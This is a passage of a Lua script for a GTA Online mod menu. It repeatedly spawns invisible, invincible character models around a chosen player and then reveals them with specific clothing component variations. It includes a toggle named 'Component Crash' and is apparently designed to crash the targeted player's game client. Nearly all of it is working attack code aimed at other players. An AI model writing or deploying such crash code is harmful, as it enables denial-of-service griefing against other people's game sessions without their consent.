                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds11[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds11[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds11[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds11[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds11[i], 3, 2, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds11[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_josh")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds12 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds12[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds12[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds12[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds12[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds12[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds12[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_lamardavis")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds13 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds13[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds13[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds13[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds13[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds13[i], 3, 2, 3, 0 )
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds13[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_lestercrest")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds14 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds14[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds14[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds14[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds14[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds14[i], 11, 2, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds14[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_lestercrest_3")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds15 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds15[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds15[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds15[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds15[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds15[i], 3, 2, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds15[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_martinmadrazo")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds16 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds16[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds16[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds16[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds16[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds16[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds16[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_milton")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds17 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds17[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds17[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds17[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds17[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds17[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds17[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_molly")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds18 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds18[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds18[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds18[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds18[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds18[i], 4, 1, 3, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds18[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_mrs_thornhill")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds19 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds19[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds19[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds19[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds19[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds19[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds19[i])
                util.yield(5)
            end
            local pedhash = util.joaat("cs_nigel")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds20 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
                coords.z = coords.z
                if loc1 == 1 then
                    coords.x = coords.x - math_random(1, 5)
                else
                    coords.x = coords.x + math_random(1, 5)
                end
                if loc2 == 1 then
                    coords.y = coords.y - math_random(1, 5)
                else
                    coords.y = coords.y + math_random(1, 5)
                end
                if loc3 == 1 then
                    coords.z = coords.z - math_random(3, 5)
                else
                    coords.z = coords.z + math_random(3, 5)
                end
                if pedt == 1 then
                    pedtype = 0
                else
                    pedtype = 3
                end
                SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], false)
                util.yield(5)
            end
            for i = 1, ped_amount do
                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds20[i], 3, 0, 1, 0)
                util.yield()
            end
            util.yield(500)
            for i = 1, ped_amount do
                entities.delete(SpawnedPeds20[i])
                util.yield(5)					
            end
            util.yield(100)
            util.toast("Done")
        else
            util.toast("You can't use it on yourself")
        end
end)



menu.toggle_loop(clothescrash, "Component Crash", {"toggleclothescrash"}, "Warning! Toggle Panic Mode First!", function()
    local math_random = math.random
    local joaat = util.joaat
    util.yield(100)
    local pedhash = util.joaat("P_franklin_02")
    while not STREAMING.HAS_MODEL_LOADED(pedhash) do
        STREAMING.REQUEST_MODEL(pedhash)
        util.yield(10)
    end
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
    SpawnedPeds1 = {}
    local ped_amount = math_random(7, 10)
    for i = 1, ped_amount do
        local pedtype = 0
        local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
        local coords = PlayerPedCoords
        local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
        coords.x = coords.x
        coords.y = coords.y
        coords.z = coords.z
        if loc1 == 1 then
            coords.x = coords.x - math_random(1, 5)
        else
            coords.x = coords.x + math_random(1, 5)
        end
        if loc2 == 1 then
            coords.y = coords.y - math_random(1, 5)
        else
            coords.y = coords.y + math_random(1, 5)
        end
        if loc3 == 1 then
            coords.z = coords.z - math_random(3, 5)
        else
            coords.z = coords.z + math_random(3, 5)
        end
        if pedt == 1 then
            pedtype = 0
        else
            pedtype = 3
        end
        SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
        TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
        util.yield(5)
    end
    for i = 1, ped_amount do
        ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
        PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
        util.yield()
    end
    util.yield(500)
    for i = 1, ped_amount do
        entities.delete(SpawnedPeds1[i])
        util.yield(5)
        local pedhash = util.joaat("cs_lazlow")
        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
            STREAMING.REQUEST_MODEL(pedhash)
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
        SpawnedPeds2 = {}
        local ped_amount = math_random(7, 10)
        for i = 1, ped_amount do
            local pedtype = 0
            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
            local coords = PlayerPedCoords
            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
            coords.x = coords.x
            coords.y = coords.y
            coords.z = coords.z
            if loc1 == 1 then
                coords.x = coords.x - math_random(1, 5)
            else
                coords.x = coords.x + math_random(1, 5)
            end
            if loc2 == 1 then
                coords.y = coords.y - math_random(1, 5)
            else
                coords.y = coords.y + math_random(1, 5)
            end
            if loc3 == 1 then
                coords.z = coords.z - math_random(3, 5)
            else
                coords.z = coords.z + math_random(3, 5)
            end
            if pedt == 1 then
                pedtype = 0
            else
                pedtype = 3
            end
            SpawnedPeds2[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds2[i], true, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds2[i], "Walk_Facility", 0, false)
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds2[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], false)
            util.yield(5)
        end
        for i = 1, ped_amount do
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds2[i], 3, 0, 3, 0)
            util.yield()
        end
        util.yield(500)
        for i = 1, ped_amount do
            entities.delete(SpawnedPeds2[i])
            util.yield(5)
        end
        util.yield(5)
        local pedhash = util.joaat("cs_taocheng")
        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
            STREAMING.REQUEST_MODEL(pedhash)
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
        SpawnedPeds3 = {}
        local ped_amount = math_random(7, 10)
        for i = 1, ped_amount do
            local pedtype = 0
            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
            local coords = PlayerPedCoords
            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
            coords.x = coords.x
            coords.y = coords.y
            coords.z = coords.z
            if loc1 == 1 then
                coords.x = coords.x - math_random(1, 5)
            else
                coords.x = coords.x + math_random(1, 5)
            end
            if loc2 == 1 then
                coords.y = coords.y - math_random(1, 5)
            else
                coords.y = coords.y + math_random(1, 5)
            end
            if loc3 == 1 then
                coords.z = coords.z - math_random(3, 5)
            else
                coords.z = coords.z + math_random(3, 5)
            end
            if pedt == 1 then
                pedtype = 0
            else
                pedtype = 3
            end
            SpawnedPeds3[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds3[i], true, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds3[i], "Walk_Facility", 0, false)
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds3[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], false)
            util.yield(5)
        end
        for i = 1, ped_amount do
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds3[i], 3, 2, 1, 0)
            util.yield()
        end
        util.yield(500)
        for i = 1, ped_amount do
            entities.delete(SpawnedPeds3[i])
            util.yield(5)
        end
        util.yield(5)
        local pedhash = util.joaat("cs_solomon")
        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
            STREAMING.REQUEST_MODEL(pedhash)
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
        SpawnedPeds4 = {}
        local ped_amount = math_random(7, 10)
        for i = 1, ped_amount do
            local pedtype = 0
            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
            local coords = PlayerPedCoords
            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
            coords.x = coords.x
            coords.y = coords.y
            coords.z = coords.z
            if loc1 == 1 then
                coords.x = coords.x - math_random(1, 5)
            else
                coords.x = coords.x + math_random(1, 5)
            end
            if loc2 == 1 then
                coords.y = coords.y - math_random(1, 5)
            else
                coords.y = coords.y + math_random(1, 5)
            end
            if loc3 == 1 then
                coords.z = coords.z - math_random(3, 5)
            else
                coords.z = coords.z + math_random(3, 5)
            end
            if pedt == 1 then
                pedtype = 0
            else
                pedtype = 3
            end
            SpawnedPeds4[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds4[i], true, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds4[i], "Walk_Facility", 0, false)
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds4[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], false)
            util.yield(5)
        end
        for i = 1, ped_amount do
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], true)
            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds4[i], 3, 0, 1, 0)
            util.yield()
        end
        util.yield(500)
        for i = 1, ped_amount do
            entities.delete(SpawnedPeds4[i])
            util.yield(5)
        end
        util.yield(5)
        local pedhash = util.joaat("cs_stevehains")
        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
            STREAMING.REQUEST_MODEL(pedhash)
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
        SpawnedPeds5 = {}
        local ped_amount = math_random(7, 10)
        for i = 1, ped_amount do
            local pedtype = 0
            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
            local coords = PlayerPedCoords
            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
            coords.x = coords.x
            coords.y = coords.y
            coords.z = coords.z
            if loc1 == 1 then
                coords.x = coords.x - math_random(1, 5)
            else
                coords.x = coords.x + math_random(1, 5)
            end
            if loc2 == 1 then
                coords.y = coords.y - math_random(1, 5)
            else
                coords.y = coords.y + math_random(1, 5)
            end
            if loc3 == 1 then
                coords.z = coords.z - math_random(3, 5)
            else
                coords.z = coords.z + math_random(3, 5)
            end
            if pedt == 1 then
                pedtype = 0
            else
                pedtype = 3
            end
            SpawnedPeds5[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds5[i], true, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds5[i], "Walk_Facility", 0, false)
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds5[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], false)
            util.yield(5)
        end
        for i = 1, ped_amount do
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds5[i], 3, 1, 1, 0)
            util.yield()
        end
        util.yield(500)
        for i = 1, ped_amount do
            entities.delete(SpawnedPeds5[i])
            util.yield(5)
            local pedhash = util.joaat("cs_taostranslator")
            while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                STREAMING.REQUEST_MODEL(pedhash)
                util.yield(10)
            end
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
            SpawnedPeds6 = {}
            local ped_amount = math_random(7, 10)
            for i = 1, ped_amount do
                local pedtype = 0
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                local coords = PlayerPedCoords
                local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                coords.x = coords.x
                coords.y = coords.y
